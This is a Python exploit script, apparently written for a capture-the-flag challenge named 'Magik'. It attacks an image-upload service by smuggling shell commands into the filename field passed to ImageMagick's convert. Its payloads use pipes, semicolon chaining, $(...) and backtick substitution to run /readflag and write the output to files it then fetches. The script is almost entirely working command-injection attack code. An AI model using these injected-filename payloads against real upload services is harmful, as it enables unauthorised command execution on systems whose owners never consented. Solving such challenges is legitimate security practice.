#!/usr/bin/env python3
"""
Magik - Final attempt
The key insight: We can inject commands, but output files aren't accessible via HTTP.
Solution: Make convert itself output the flag as an image or accessible file.
"""

import requests
import base64
import time

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it/"
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==')

print("[*] Strategy: Since static/ may not exist, let's write to index.php location")
print()

# The command runs as: convert /tmp/... ... static/<name>.png
# We control <name>
# Goal: Overwrite index.php with flag content

print("[TEST 1] Try to write flag by overwriting index.php")
print("  Command: convert ... static/../index.php")
print("  Inject: ../ |/readflag>index.php x")

r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': '../FLAGFILE |/readflag>FLAGFILE x'},
    timeout=10)
print(f"  Upload: {r.status_code}")
time.sleep(2)

# Try to access the file
r2 = requests.get(f"{URL}FLAGFILE", timeout=3)
print(f"  Access /FLAGFILE: {r2.status_code} ({len(r2.content)} bytes)")
if r2.status_code == 200:
    try:
        text = r2.text
        if 'ptm{' in text:
            print(f"\n*** FLAG: {text} ***\n")
        else:
            print(f"  Content: {text[:200]}")
    except:
        pass

print("\n" + "="*60 + "\n")

# Try alternate location
print("[TEST 2] Write to /tmp and use file:// protocol (if no colon filter)")
r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'x.png;/readflag>/tmp/flag.txt;ls -la /tmp>/tmp/ls.txt;y'},
    timeout=10)
print(f"  Upload: {r.status_code}")

print("\n" + "="*60 + "\n")

# The real solution: ImageMagick's inline: protocol or similar
print("[TEST 3] Use ImageMagick to convert flag text to image")
print("  This might work if we can get /readflag output into convert's pipeline")

# Try: /readflag | convert label:@- output.png
# But label: needs colon...

# Alternative: Use process substitution or command substitution
payloads = [
    'x $(</readflag>gotflag.txt) y',  # Command substitution
    'x `/readflag>backtick.txt` y',  # Backtick substitution
]

for i, payload in enumerate(payloads, 1):
    print(f"\n  [{i}] Testing: {payload}")
    r = requests.post(URL,
        files={'img': ('test.png', png, 'application/octet-stream')},
        data={'name': payload},
        timeout=10)
    print(f"      Upload: {r.status_code}")

    time.sleep(1)

    # Try to find any created file
    for fname in ['gotflag.txt', 'backtick.txt', 'x.png', 'y.png']:
        try:
            r2 = requests.get(f"{URL}{fname}", timeout=2)
            if r2.status_code == 200 and len(r2.content) < 1000:
                print(f"      Found /{fname}: {r2.text[:100]}")
                if 'ptm{' in r2.text:
                    print(f"\n*** FLAG: {r2.text} ***\n")
        except:
            pass

print("\n" + "="*60 + "\n")
print("[TEST 4] Most direct approach - no output file, just execute")
print("  Since files aren't accessible, maybe the flag is returned in HTTP response?")

# Try to make convert fail in a way that shows the flag
r = requests.post(URL,
    files={'img': ('test.png', png, 'application/octet-stream')},
    data={'name': 'xxx $(/readflag) yyy'},
    timeout=10)
print(f"  Upload: {r.status_code}")
print(f"  Response length: {len(r.content)}")
if len(r.content) > 0 and len(r.content) < 500:
    print(f"  Response: {r.text}")
